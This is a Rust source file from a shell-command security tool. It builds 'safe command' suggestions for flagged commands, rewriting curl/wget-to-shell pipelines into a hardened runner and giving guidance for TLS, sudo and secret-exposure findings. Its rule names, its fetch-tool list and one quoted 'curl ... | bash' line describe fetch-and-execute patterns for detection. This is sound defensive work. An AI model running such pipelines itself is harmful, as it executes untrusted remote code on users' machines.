//! Safe-command suggestions — concrete "what to run instead" rewrites.
//!
//! The engine behind `tirith check --suggest-safe-command`. Purely advisory
//! (never influences detection, verdicts, or exit codes): it inspects a
//! computed [`Verdict`] plus the command and proposes transformations. Generic
//! suggestion constructors are deliberately guidance-only because they do not
//! own the complete execution provenance. The one executable boundary,
//! [`suggest_verified_for_cli_inline_with_policy_and_session`], is reserved for
//! the CLI's inline `check`/`fix` path and requires its frozen policy, session,
//! and analysis context; it resolves and stamps the CLI origin internally. A
//! wrong suggestion is worse than none: a partial transformation remains
//! guidance-only and never crosses the executable field boundary.
//!
//! [`SafeSuggestion::safe_command`] is the only executable rewrite channel.
//!
//! Mechanical candidates require whole-command effective verification before
//! executable use. Pipe-to-shell delegates to hardened `tirith run --capsule`;
//! archive/dotfile findings are guidance-only. TLS, HTTP, typosquat,
//! sudo, and environment findings are guidance-only because shell/tool option
//! semantics cannot be safely reconstructed from the current token model.

use std::collections::{HashSet, VecDeque};
use std::path::Path;

use crate::engine::{self, AnalysisContext};
use crate::extract::ScanContext;
use crate::policy::Policy;
use crate::tokenize::{self, ShellType};
#[cfg(test)]
use crate::verdict::Severity;
use crate::verdict::{Action, Finding, RuleId, Verdict};

/// A single safe-command suggestion tied to one finding. Multi-step rewrites
/// live in [`Self::safe_command`] with steps joined by ` && `.
#[derive(Debug, Clone, serde::Serialize)]
pub struct SafeSuggestion {
    /// The rule this addresses (snake_case, e.g. `curl_pipe_shell`).
    pub rule_id: String,
    /// A concrete command whose exact final form re-analyzed to
    /// [`Action::Allow`], or `None` when only guidance is available.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub safe_command: Option<String>,
    /// Why the suggestion is safer, or why no rewrite is possible.
    pub rationale: String,
    /// The per-rule remediation advice (always populated; never fabricated).
    pub remediation: String,
}

/// Public compatibility accessor routed directly to the typed sensitive-asset
/// registry. There is no second parsed/live environment catalog.
pub fn sensitive_env_vars() -> &'static [&'static str] {
    crate::sensitive_assets::secret_env_names()
}

/// Build guidance-only safe-command suggestions in a default non-interactive
/// Exec context, one [`SafeSuggestion`] per rule id (deduplicated).
///
/// Two command-shape transforms (`sudo_narrow`, `env_scrub`) also run once per
/// verdict, keyed on the command shape / process env rather than a [`RuleId`].
/// The constructed context has no cwd/card/clipboard metadata; callers that own
/// those values should use [`suggest_verified_with_policy`]. This compatibility
/// API never populates [`SafeSuggestion::safe_command`]. Empty when the verdict
/// has no findings.
pub fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
    let ctx = default_exec_context(cmd, shell);
    guidance_only_candidates(&ctx, verdict, None)
}

fn default_exec_context(cmd: &str, shell: ShellType) -> AnalysisContext {
    AnalysisContext {
        input: cmd.to_string(),
        shell,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: false,
        cwd: None,
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    }
}

/// Build guidance-only suggestions for callers that do not own the exact policy
/// and session used for the verdict.
///
/// This compatibility entry point does not rediscover policy and never
/// populates [`SafeSuggestion::safe_command`].
pub fn suggest_verified(ctx: &AnalysisContext, verdict: &Verdict) -> Vec<SafeSuggestion> {
    guidance_only_candidates(ctx, verdict, None)
}

/// Build guidance-only suggestions bound to a supplied policy snapshot.
///
/// A frozen policy alone is not complete execution provenance, so this generic
/// API never populates [`SafeSuggestion::safe_command`].
pub fn suggest_verified_with_policy(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: &Policy,
) -> Vec<SafeSuggestion> {
    guidance_only_candidates(ctx, verdict, Some(policy))
}

/// Build guidance-only suggestions bound to a supplied policy and session.
///
/// Even with those values, a generic caller has not established that the
/// verdict came from Tirith's CLI-inline analysis path. This compatibility API
/// therefore never populates [`SafeSuggestion::safe_command`].
pub fn suggest_verified_with_policy_and_session(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: &Policy,
    _session_id: &str,
) -> Vec<SafeSuggestion> {
    guidance_only_candidates(ctx, verdict, Some(policy))
}

/// Build executable suggestions for Tirith's exact CLI-inline `check`/`fix`
/// path.
///
/// This boundary accepts no caller-supplied verdict or origin. It performs the
/// original analysis itself under the supplied frozen policy, applies the CLI's
/// Inline runtime enrichment, stamps the locally resolved CLI origin, and runs
/// read-only effective post-processing under the supplied session. Candidate
/// commands repeat that same producer-owned pipeline with the same origin.
/// Only an approval-free effective [`Action::Allow`] may populate
/// `safe_command`.
pub fn suggest_verified_for_cli_inline_with_policy_and_session(
    ctx: &AnalysisContext,
    policy: &Policy,
    session_id: &str,
) -> Vec<SafeSuggestion> {
    let trusted_runner = trusted_current_tirith_path();
    suggest_verified_for_cli_inline_with_policy_session_and_runner(
        ctx,
        policy,
        session_id,
        trusted_runner.as_deref(),
    )
}

/// Producer-owned exact seam used by the public CLI API and by Linux tests that
/// inject a fixed Tirith path. Callers cannot supply either the original verdict
/// or its origin: both are derived here before candidate generation begins.
fn suggest_verified_for_cli_inline_with_policy_session_and_runner(
    ctx: &AnalysisContext,
    policy: &Policy,
    session_id: &str,
    trusted_runner: Option<&Path>,
) -> Vec<SafeSuggestion> {
    let origin = crate::agent_origin::resolve_cli_origin(ctx.interactive);
    let verdict = analyze_cli_inline_candidate(ctx, &origin, policy, session_id);
    verify_cli_inline_suggestions_with_runner(ctx, &verdict, policy, trusted_runner, session_id)
}

fn analyze_cli_inline_candidate(
    ctx: &AnalysisContext,
    origin: &crate::agent_origin::AgentOrigin,
    policy: &Policy,
    session_id: &str,
) -> Verdict {
    let mut raw = engine::analyze_with_policy_without_bypass(ctx, policy);
    let runtime_findings = crate::threatdb_api::enrich_command(
        &ctx.input,
        ctx.shell,
        &policy.threat_intel,
        crate::threatdb_api::RuntimeThreatMode::Inline,
    );
    if !runtime_findings.is_empty() {
        raw.findings.extend(runtime_findings);
        raw.action = crate::verdict::upgraded_action_from_findings(&raw.findings, raw.action);
    }
    raw.agent_origin = Some(origin.clone());
    crate::escalation::post_process_verdict_for_verification(
        &raw,
        policy,
        &ctx.input,
        session_id,
        crate::escalation::CallerContext::Cli,
    )
}

fn guidance_only_candidates(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: Option<&Policy>,
) -> Vec<SafeSuggestion> {
    let mut suggestions = suggest_candidates_with_runner(ctx, verdict, policy, None);
    strip_executable_candidates(
        &mut suggestions,
        " The mechanical transformation is guidance-only because this API does not own the complete CLI-inline execution provenance.",
    );
    suggestions
}

fn strip_executable_candidates(suggestions: &mut [SafeSuggestion], reason: &str) {
    for suggestion in suggestions {
        if suggestion.safe_command.take().is_some() {
            suggestion.rationale.push_str(reason);
        }
    }
}

fn verify_cli_inline_suggestions_with_runner(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: &Policy,
    trusted_runner: Option<&Path>,
    session_id: &str,
) -> Vec<SafeSuggestion> {
    let mut suggestions =
        suggest_candidates_with_runner(ctx, verdict, Some(policy), trusted_runner);
    if ctx.scan_context != ScanContext::Exec || ctx.raw_bytes.is_some() || ctx.file_path.is_some() {
        strip_executable_candidates(
            &mut suggestions,
            " The mechanical transformation is guidance-only because executable suggestions require the CLI's exact command-analysis context.",
        );
        return suggestions;
    }
    if verdict.requires_approval == Some(true) {
        strip_executable_candidates(
            &mut suggestions,
            " The mechanical transformation is guidance-only while approval remains required for the original command.",
        );
        return suggestions;
    }
    let Some(candidate_origin) = verdict.agent_origin.clone() else {
        strip_executable_candidates(
            &mut suggestions,
            " The mechanical transformation is guidance-only because the effective CLI-inline verdict has no stamped agent origin.",
        );
        return suggestions;
    };
    let initial_candidates: Vec<(String, String)> = suggestions
        .iter()
        .filter_map(|suggestion| {
            suggestion
                .safe_command
                .as_ref()
                .map(|command| (command.clone(), suggestion.rule_id.clone()))
        })
        .collect();

    if initial_candidates.is_empty() {
        return suggestions;
    }

    const MAX_COMPOSITION_STEPS: usize = 8;
    const MAX_CANDIDATES: usize = 64;

    #[derive(Debug)]
    struct Candidate {
        command: String,
        rule_path: Vec<String>,
        steps: usize,
    }

    let mut queue = VecDeque::new();
    let mut seen = HashSet::from([ctx.input.clone()]);
    for (command, rule_id) in initial_candidates {
        if seen.insert(command.clone()) {
            queue.push_back(Candidate {
                command,
                rule_path: vec![rule_id],
                steps: 1,
            });
        }
    }

    let mut examined = 0usize;
    let mut verified: Option<Candidate> = None;
    while let Some(candidate) = queue.pop_front() {
        if examined >= MAX_CANDIDATES {
            break;
        }
        examined += 1;

        let candidate_ctx = context_with_input(ctx, candidate.command.clone());
        // Repeat the same producer-owned CLI-inline pipeline used to analyze the
        // original command. No caller-supplied verdict or generic daemon mode can
        // cross this executable-output boundary.
        let candidate_verdict =
            analyze_cli_inline_candidate(&candidate_ctx, &candidate_origin, policy, session_id);
        if candidate_verdict.action == Action::Allow
            && candidate_verdict.requires_approval != Some(true)
        {
            verified = Some(candidate);
            break;
        }

        if candidate.steps >= MAX_COMPOSITION_STEPS {
            continue;
        }

        for next in suggest_candidates_with_runner(
            &candidate_ctx,
            &candidate_verdict,
            Some(policy),
            trusted_runner,
        ) {
            let Some(command) = next.safe_command else {
                continue;
            };
            if seen.insert(command.clone()) {
                let mut rule_path = candidate.rule_path.clone();
                rule_path.push(next.rule_id);
                queue.push_back(Candidate {
                    command,
                    rule_path,
                    steps: candidate.steps + 1,
                });
            }
        }
    }

    // A transformation that was not the exact Allow result is guidance, not an
    // executable command. Do not leak the partial command into the structured
    // contract; human renderers can safely show the static rationale/remediation.
    strip_executable_candidates(
        &mut suggestions,
        " The mechanical transformation is guidance-only because the exact resulting command did not independently re-analyze to Allow.",
    );

    if let Some(verified) = verified {
        let anchor_rule = verified.rule_path.first().cloned().unwrap_or_default();
        let anchor = suggestions
            .iter_mut()
            .find(|suggestion| suggestion.rule_id == anchor_rule);
        let rationale = if verified.rule_path.len() == 1 {
            "The exact final command reached effective Allow under the same shell, context, origin, session, and policy."
                .to_string()
        } else {
            format!(
                "Composes compatible remediations for {}; the exact final command reached effective Allow under the same shell, context, origin, session, and policy.",
                verified.rule_path.join(", ")
            )
        };

        if let Some(anchor) = anchor {
            anchor.safe_command = Some(verified.command);
            anchor.rationale = rationale;
        } else {
            suggestions.push(SafeSuggestion {
                rule_id: "composed_safe_command".to_string(),
                safe_command: Some(verified.command),
                rationale,
                remediation: "Review the composed command before running it.".to_string(),
            });
        }
    }

    suggestions
}

fn context_with_input(ctx: &AnalysisContext, input: String) -> AnalysisContext {
    let raw_bytes = ctx.raw_bytes.as_ref().map(|_| input.as_bytes().to_vec());
    AnalysisContext {
        input,
        shell: ctx.shell,
        scan_context: ctx.scan_context,
        raw_bytes,
        interactive: ctx.interactive,
        cwd: ctx.cwd.clone(),
        file_path: ctx.file_path.clone(),
        repo_root: ctx.repo_root.clone(),
        is_config_override: ctx.is_config_override,
        clipboard_html: ctx.clipboard_html.clone(),
        card_ref: ctx.card_ref.clone(),
        clipboard_source: ctx.clipboard_source.clone(),
    }
}

fn suggest_candidates_with_runner(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: Option<&Policy>,
    trusted_runner: Option<&Path>,
) -> Vec<SafeSuggestion> {
    let cmd = &ctx.input;
    let shell = ctx.shell;
    let segments = tokenize::tokenize(cmd, shell);
    let mut out: Vec<SafeSuggestion> = Vec::new();
    let mut seen: Vec<RuleId> = Vec::new();

    for finding in &verdict.findings {
        if seen.contains(&finding.rule_id) {
            continue;
        }
        seen.push(finding.rule_id);
        out.push(build_suggestion(
            cmd,
            shell,
            &segments,
            finding,
            trusted_runner,
        ));
    }

    // Command-shape transforms fire at most once per verdict, only when there
    // are findings to rewrite.
    if !verdict.findings.is_empty() {
        if let Some(s) = build_sudo_narrow_suggestion(ctx, &segments, verdict, policy) {
            out.push(s);
        }
        if let Some(s) = build_env_scrub_suggestion(cmd, shell, verdict, ctx.cwd.as_deref(), policy)
        {
            out.push(s);
        }
    }

    out
}

fn build_suggestion(
    _cmd: &str,
    shell: ShellType,
    segments: &[tokenize::Segment],
    finding: &Finding,
    trusted_runner: Option<&Path>,
) -> SafeSuggestion {
    let remediation = crate::rule_explanations::remediation(finding.rule_id).to_string();
    let rule_id = finding.rule_id.to_string();

    let (safe_command, rationale) = match finding.rule_id {
        RuleId::CurlPipeShell
        | RuleId::WgetPipeShell
        | RuleId::HttpiePipeShell
        | RuleId::XhPipeShell
        | RuleId::PipeToInterpreter => match rewrite_pipe_to_shell(segments, shell, trusted_runner)
        {
            Some(rewrite) => (
                Some(rewrite),
                "Delegates the bounded download, in-memory policy review, confirmation, \
                 private hash-verified materialization, and execution to Tirith's \
                 fail-closed capsule runner."
                    .to_string(),
            ),
            None => (
                None,
                "No safe executable rewrite is available on this platform or for this \
                 pipeline. Download into a private location, verify and review the exact \
                 bytes, then execute that same copy in a containment boundary."
                    .to_string(),
            ),
        },
        // TLS flags can be option values (for example `curl --data -k`), and a
        // URL-looking curl argument can belong to `--header`/`--data` rather
        // than the fetch destination. Without a complete tool-option grammar,
        // either deletion/replacement can change semantics. Keep both families
        // guidance-only instead of guessing an executable argv rewrite.
        RuleId::InsecureTlsFlags => (
            None,
            "Remove the insecure TLS flag (-k / --insecure / --no-check-certificate) \
             from the exact downloader option position so certificates remain verified."
                .to_string(),
        ),
        RuleId::PlainHttpToSink => (
            None,
            "Fetch the actual destination URL over HTTPS instead of plain HTTP; verify \
             the host serves the same resource before changing it."
                .to_string(),
        ),
        RuleId::ThreatPackageTyposquat => (
            None,
            "The threat database flagged this name as a typosquat. Confirm the legitimate \
             package and its ecosystem-specific name by hand; package-manager option grammar \
             makes an automatic operand substitution unsafe."
                .to_string(),
        ),
        RuleId::ArchiveExtract => (
            None,
            "Inspect every archive entry and validate normalized extraction paths before \
             extracting. A preview followed by the original extract is still unsafe and \
             is guidance-only; it cannot be emitted as an executable rewrite."
                .to_string(),
        ),
        RuleId::DotfileOverwrite => (
            None,
            "Review the exact target and intended content, then make a verified backup before \
             changing the dotfile. Backup-then-original still performs the flagged overwrite \
             and is guidance-only; it cannot be emitted as an executable rewrite."
                .to_string(),
        ),
        // Every other rule: no safe mechanical rewrite — remediation guides.
        _ => (
            None,
            "No automatic safe rewrite for this finding — see the remediation below.".to_string(),
        ),
    };

    SafeSuggestion {
        rule_id,
        safe_command,
        rationale,
        remediation,
    }
}

/// Shell interpreters whose stdin invocation contract is represented by
/// [`crate::runner::PipeInterpreter`].
#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn pipe_interpreter(name: &str) -> Option<crate::runner::PipeInterpreter> {
    name.parse().ok()
}

/// Rewrite `<fetch> URL | <shell>` into one hardened runner invocation.
///
/// `None` unless the command is exactly a single stdout pipe from a supported
/// URL-fetch command into a supported shell stdin invocation. Every URL,
/// command, and sink argument must be a statically-decodable literal in the
/// caller's shell. Dynamic, malformed, or control-bearing words remain
/// guidance-only.
///
/// On x86_64 Linux, the emitted command carries the selected interpreter, argv,
/// and stdin mode as typed arguments. It invokes the currently-running, validated
/// Tirith executable by absolute path, so later shell evaluation cannot resolve a
/// repo/PATH shadow named `tirith`. The runner therefore ignores a hostile remote
/// shebang and preserves `curl ... | bash`'s stdin semantics. Other architectures
/// and platforms remain guidance-only until their containment backend can prove
/// this launch contract end to end.
fn rewrite_pipe_to_shell(
    segments: &[tokenize::Segment],
    shell: ShellType,
    trusted_runner: Option<&Path>,
) -> Option<String> {
    let _ = trusted_runner;
    if segments.len() != 2 {
        return None;
    }
    let source = &segments[0];
    let sink = &segments[1];
    // `|&` also forwards downloader stderr. The typed runner only forwards the
    // response body, so claiming equivalence would be wrong.
    if sink.preceding_separator.as_deref() != Some("|") {
        return None;
    }
    // PowerShell requires the call operator (`&`) before a quoted executable
    // path.  The tokenizer intentionally does not model that invocation form,
    // so emitting a quoted absolute Tirith path would produce a string value,
    // not an executable command.  Keep both Windows shell families
    // guidance-only until their complete launch grammar is represented.
    if matches!(shell, ShellType::PowerShell | ShellType::Cmd) {
        return None;
    }
    // Prefix assignments can alter downloader or interpreter behavior. The
    // typed runner does not carry an arbitrary environment, so dropping them
    // would not preserve the original invocation.
    if !tokenize::leading_env_assignments(&source.raw).is_empty()
        || !tokenize::leading_env_assignments(&sink.raw).is_empty()
    {
        return None;
    }

    let source_cmd = decode_shell_literal(source.command.as_deref()?, shell)?;
    if !is_url_fetch_command(&source_cmd) {
        return None;
    }
    let sink_cmd = decode_shell_literal(sink.command.as_deref()?, shell)?;
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    let interpreter = pipe_interpreter(&sink_cmd)?;
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    let _ = &sink_cmd;

    let source_args = decode_literal_words(&source.args, shell)?;
    let url = supported_fetch_url(&source_cmd, &source_args)?;
    let sink_args = decode_literal_words(&sink.args, shell)?;
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    if !crate::runner::pipe_interpreter_args_supported(interpreter, &sink_args) {
        return None;
    }

    let encoded_url = encode_shell_literal(&url, shell)?;

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let path = trusted_runner?.to_str()?;
        let encoded_tirith = encode_shell_literal(path, shell)?;
        let mut command = format!(
            "{encoded_tirith} run --capsule --script-stdin --interpreter {}",
            interpreter.as_str()
        );
        for arg in sink_args {
            let option = format!("--interpreter-arg={arg}");
            let encoded = encode_shell_literal(&option, shell)?;
            command.push(' ');
            command.push_str(&encoded);
        }
        command.push(' ');
        command.push_str(&encoded_url);
        Some(command)
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        let _ = (encoded_url, sink_args);
        None
    }
}

fn trusted_current_tirith_path() -> Option<std::path::PathBuf> {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let executable = crate::trusted_child::TrustedExecutable::current()
            .ok()?
            .require_safe_reinvocation_provenance()
            .ok()?;
        is_tirith_runner_path(executable.path()).then(|| executable.path().to_path_buf())
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        None
    }
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
fn is_tirith_runner_path(path: &Path) -> bool {
    path.file_name() == Some(std::ffi::OsStr::new("tirith"))
}

/// Encode one already-decoded argument and prove the selected shell decoder
/// recovers exactly the same UTF-8 bytes. This is intentionally an assertion in
/// the construction path, not merely a quoting best-effort.
fn encode_shell_literal(value: &str, shell: ShellType) -> Option<String> {
    if value.chars().any(char::is_control) {
        return None;
    }
    let encoded = match shell {
        ShellType::Posix | ShellType::Fish => shell_single_quote(value)?,
        ShellType::PowerShell => format!("'{}'", value.replace('\'', "''")),
        ShellType::Cmd => return None,
    };
    (decode_shell_literal(&encoded, shell).as_deref() == Some(value)).then_some(encoded)
}

fn decode_literal_words(words: &[String], shell: ShellType) -> Option<Vec<String>> {
    words
        .iter()
        .map(|word| decode_shell_literal(word, shell))
        .collect()
}

/// Decode a single shell word only when its value is fully literal. Expansion,
/// substitution, globbing, operators, malformed quotes, and decoded controls
/// are rejected instead of being removed or normalized.
fn decode_shell_literal(word: &str, shell: ShellType) -> Option<String> {
    match shell {
        ShellType::Posix => decode_posix_literal(word),
        ShellType::Fish => decode_fish_literal(word),
        ShellType::PowerShell => decode_powershell_literal(word),
        ShellType::Cmd => None,
    }
}

fn push_literal(out: &mut String, ch: char) -> Option<()> {
    if ch.is_control() {
        return None;
    }
    out.push(ch);
    Some(())
}

fn decode_posix_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                '\\' => {
                    i += 1;
                    push_literal(&mut out, *chars.get(i)?)?;
                }
                // These have expansion, substitution, glob, grouping, or
                // operator meaning when unquoted.
                '$' | '`' | '*' | '?' | '[' | ']' | '{' | '}' | '(' | ')' | '<' | '>' | '|'
                | '&' | ';' | '!' => return None,
                '~' if out.is_empty() => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => {
                if ch == '\'' {
                    quote = Quote::Bare;
                } else {
                    push_literal(&mut out, ch)?;
                }
            }
            Quote::Double => match ch {
                '"' => quote = Quote::Bare,
                '$' | '`' => return None,
                '\\' => {
                    let next = *chars.get(i + 1)?;
                    if matches!(next, '$' | '`' | '"' | '\\') {
                        i += 1;
                        push_literal(&mut out, next)?;
                    } else if next == '\n' {
                        return None;
                    } else {
                        // POSIX preserves a backslash before other characters
                        // inside double quotes.
                        push_literal(&mut out, '\\')?;
                    }
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

fn decode_fish_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                // Fish's unquoted backslash grammar includes semantic escapes
                // (`\\xNN`, octal, `\\uNNNN`, `\\UNNNNNNNN`, `\\e`, and
                // control-producing forms). A one-character POSIX-style decoder
                // cannot preserve those bytes. Refuse every bare backslash and
                // keep the finding guidance-only rather than emit a rewrite whose
                // URL or argv differs from what Fish would execute.
                '\\' => return None,
                '$' | '*' | '?' | '(' | ')' | '{' | '}' | '[' | ']' | '<' | '>' | '|' | '&'
                | ';' => return None,
                '~' if out.is_empty() => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => match ch {
                '\'' => quote = Quote::Bare,
                '\\' if matches!(chars.get(i + 1), Some('\'' | '\\')) => {
                    i += 1;
                    push_literal(&mut out, chars[i])?;
                }
                c => push_literal(&mut out, c)?,
            },
            Quote::Double => match ch {
                '"' => quote = Quote::Bare,
                '$' | '(' | ')' => return None,
                '\\' => {
                    let next = *chars.get(i + 1)?;
                    if matches!(next, '$' | '"' | '\\') {
                        i += 1;
                        push_literal(&mut out, next)?;
                    } else if next == '\n' {
                        return None;
                    } else {
                        push_literal(&mut out, '\\')?;
                    }
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

fn decode_powershell_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    fn escaped(ch: char) -> char {
        match ch {
            '0' => '\0',
            'a' => '\u{0007}',
            'b' => '\u{0008}',
            'e' => '\u{001b}',
            'f' => '\u{000c}',
            'n' => '\n',
            'r' => '\r',
            't' => '\t',
            'v' => '\u{000b}',
            other => other,
        }
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        // PowerShell treats curly quote characters as string delimiters too.
        // The command tokenizer does not model those alternate delimiters, so
        // refuse them instead of decoding them as ordinary URL bytes.
        if matches!(ch, '\u{2018}' | '\u{2019}' | '\u{201c}' | '\u{201d}') {
            return None;
        }
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                '`' => {
                    i += 1;
                    let next = *chars.get(i)?;
                    // PowerShell 6+ consumes the full `u{...}` sequence as one
                    // Unicode escape. This bounded decoder intentionally does
                    // not implement that variable-length grammar.
                    if next == 'u' && chars.get(i + 1) == Some(&'{') {
                        return None;
                    }
                    push_literal(&mut out, escaped(next))?;
                }
                '$' | '@' | '*' | '?' | '[' | ']' | '{' | '}' | '(' | ')' | '<' | '>' | '|'
                | '&' | ';' | ',' => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => {
                if ch == '\'' {
                    if chars.get(i + 1) == Some(&'\'') {
                        i += 1;
                        push_literal(&mut out, '\'')?;
                    } else {
                        quote = Quote::Bare;
                    }
                } else {
                    push_literal(&mut out, ch)?;
                }
            }
            Quote::Double => match ch {
                '"' if chars.get(i + 1) == Some(&'"') => {
                    i += 1;
                    push_literal(&mut out, '"')?;
                }
                '"' => quote = Quote::Bare,
                '$' => return None,
                '`' => {
                    i += 1;
                    let next = *chars.get(i)?;
                    if next == 'u' && chars.get(i + 1) == Some(&'{') {
                        return None;
                    }
                    push_literal(&mut out, escaped(next))?;
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

/// Return the one exact HTTPS response-body URL represented by a supported
/// downloader argv. Unsupported downloader behavior remains guidance-only.
fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
    let mut urls = Vec::new();
    match command {
        "curl" => {
            let mut fail_on_http_error = false;
            let mut follow_redirects = false;
            for arg in args {
                if starts_with_http(arg) {
                    urls.push(arg.clone());
                } else if let Some(long) = arg.strip_prefix("--") {
                    if !matches!(long, "fail" | "silent" | "show-error" | "location") {
                        return None;
                    }
                    fail_on_http_error |= long == "fail";
                    follow_redirects |= long == "location";
                } else {
                    let short = arg.strip_prefix('-')?;
                    if short.is_empty()
                        || !short.chars().all(|ch| matches!(ch, 'f' | 's' | 'S' | 'L'))
                    {
                        return None;
                    }
                    fail_on_http_error |= short.contains('f');
                    follow_redirects |= short.contains('L');
                }
            }
            // Tirith's bounded fetcher follows validated redirects and rejects
            // every non-2xx response. A curl pipeline has those semantics only
            // when both -L/--location and -f/--fail are explicit; otherwise the
            // rewrite could execute different response bytes than the literal
            // command. Keep mismatched forms guidance-only.
            if !(fail_on_http_error && follow_redirects) {
                return None;
            }
        }
        "wget" => {
            let mut stdout = false;
            let mut index = 0usize;
            while index < args.len() {
                let arg = &args[index];
                if starts_with_http(arg) {
                    urls.push(arg.clone());
                } else if matches!(arg.as_str(), "-q" | "--quiet") {
                } else if matches!(arg.as_str(), "-qO-" | "-O-") {
                    stdout = true;
                } else if arg == "-O" && args.get(index + 1).is_some_and(|next| next == "-") {
                    stdout = true;
                    index += 1;
                } else {
                    return None;
                }
                index += 1;
            }
            if !stdout {
                return None;
            }
        }
        // HTTPie/xh/fetch output formatting and option semantics are not yet a
        // proven byte-for-byte body stream contract.
        _ => return None,
    }
    if urls.len() != 1 {
        return None;
    }
    let url = urls.pop()?;
    if url.chars().any(char::is_control) {
        return None;
    }
    let parsed = url::Url::parse(&url).ok()?;
    if parsed.scheme() != "https" || parsed.host_str().is_none() || parsed.as_str() != url {
        return None;
    }
    Some(url)
}

// ── Sudo narrow (command-shape based) ──────────────────────────────────────

/// Sudo rewrites are guidance-only. Removing `sudo` changes command lookup
/// (secure_path, aliases/functions, and option parsing) and therefore cannot be
/// proven equivalent from Tirith's shell-token model. Keeping the suggestion
/// visible without an executable field is safer than guessing an inner span.
fn build_sudo_narrow_suggestion(
    ctx: &AnalysisContext,
    segments: &[tokenize::Segment],
    _verdict: &Verdict,
    _policy: Option<&Policy>,
) -> Option<SafeSuggestion> {
    let shell = ctx.shell;
    let leader = base_command(segments.first()?.command.as_deref()?, shell);
    if leader != "sudo" {
        return None;
    }
    Some(SafeSuggestion {
        rule_id: "sudo_narrow".to_string(),
        safe_command: None,
        rationale: "No safe mechanical rewrite is available: sudo option grammar and \
                    secure_path can resolve a different executable than the caller's shell. \
                    Avoid interactive root shells and narrow elevation manually."
            .to_string(),
        remediation: "Identify the exact absolute executable and minimal operation that needs \
                      elevation, then apply sudo only to that operation. Don't run an \
                      interactive root shell."
            .to_string(),
    })
}

// ── Env scrub (command-shape based) ────────────────────────────────────────

/// Build guidance for scrubbing sensitive environment variables. This is never
/// an executable rewrite: a parent shell expands `$VAR` before `env` runs,
/// `env -u` is not portable across Tirith's supported shells, policy-controlled
/// variable names need a typed argv boundary, and shell builtins/functions
/// cannot be wrapped without semantic drift.
fn build_env_scrub_suggestion(
    _cmd: &str,
    _shell: ShellType,
    verdict: &Verdict,
    _cwd: Option<&str>,
    _policy: Option<&Policy>,
) -> Option<SafeSuggestion> {
    // Fire only on the dedicated, audit-visible exposure rule. Severity alone
    // says nothing about environment inheritance; treating every High finding
    // as an env leak produced unrelated and misleading guidance.
    let dedicated_rule_present = verdict
        .findings
        .iter()
        .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
    if !dedicated_rule_present {
        return None;
    }

    Some(SafeSuggestion {
        rule_id: "env_scrub".to_string(),
        safe_command: None,
        rationale: "No safe shell-string rewrite is available: variable expansion happens in \
                    the parent shell, and unset syntax differs by shell. Use a typed environment \
                    boundary or a clean subshell/container instead."
            .to_string(),
        remediation: "Run the command in a clean environment or containment boundary that passes \
                      only an explicit allowlist of variables. Do not interpolate secrets into \
                      the command line."
            .to_string(),
    })
}

// ── Shared helpers ──────────────────────────────────────────────────────────

/// URL-fetch command base names that piping into a shell is dangerous for.
fn is_url_fetch_command(cmd: &str) -> bool {
    matches!(cmd, "curl" | "wget" | "http" | "https" | "xh" | "fetch")
}

/// Strip one matched pair of surrounding quotes (`"` or `'`).
fn strip_quotes(s: &str) -> String {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}

